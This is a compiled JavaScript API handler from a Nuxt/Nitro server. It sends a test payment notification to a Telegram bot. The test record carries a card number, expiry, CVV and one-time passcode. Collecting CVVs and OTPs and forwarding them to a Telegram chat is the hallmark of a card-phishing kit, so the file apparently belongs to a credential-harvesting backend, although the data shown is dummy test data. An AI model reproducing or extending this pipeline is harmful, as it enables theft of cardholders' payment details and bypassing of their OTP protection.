import { d as defineEventHandler, c as createError } from '../../../../_/nitro.mjs';
import { g as getTelegramConfig, a as sendTelegramNotification } from '../../../../_/telegram.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'node:url';
import '../../../../_/db.mjs';
import 'better-sqlite3';
import 'path';

const test = defineEventHandler(async (event) => {
  if (event.node.req.method !== "POST") {
    throw createError({
      statusCode: 405,
      statusMessage: "Method Not Allowed"
    });
  }
  try {
    const config = await getTelegramConfig();
    if (!config || !config.bot_token || !config.chat_id) {
      throw createError({
        statusCode: 400,
        statusMessage: "Telegram configuration not found or incomplete"
      });
    }
    const testPayment = {
      id: 999999,
      method: "VISA",
      card_number: "4111 1111 1111 1111",
      cardholder_name: "TEST USER",
      expiry: "12/25",
      cvv: "123",
      otp: "123456",
      status: "pending",
      created_at: (/* @__PURE__ */ new Date()).toISOString()
    };
    console.log("\u{1F9EA} DEBUG: Sending test Telegram notification");
    const success = await sendTelegramNotification(testPayment, true);
    if (success) {
      return {
        success: true,
        message: "Test Telegram notification sent successfully!"
      };
    } else {
      throw createError({
        statusCode: 500,
        statusMessage: "Failed to send test Telegram notification"
      });
    }
  } catch (error) {
    console.error("\u{1F6A8} DEBUG: Error in test Telegram API:", error);
    if (error.statusCode === 400) {
      throw createError({
        statusCode: 400,
        statusMessage: error.statusMessage || "Telegram configuration not found or incomplete"
      });
    }
    throw createError({
      statusCode: 500,
      statusMessage: "Failed to send Telegram notification. Please check your bot token and chat ID."
    });
  }
});

export { test as default };
//# sourceMappingURL=test.mjs.map
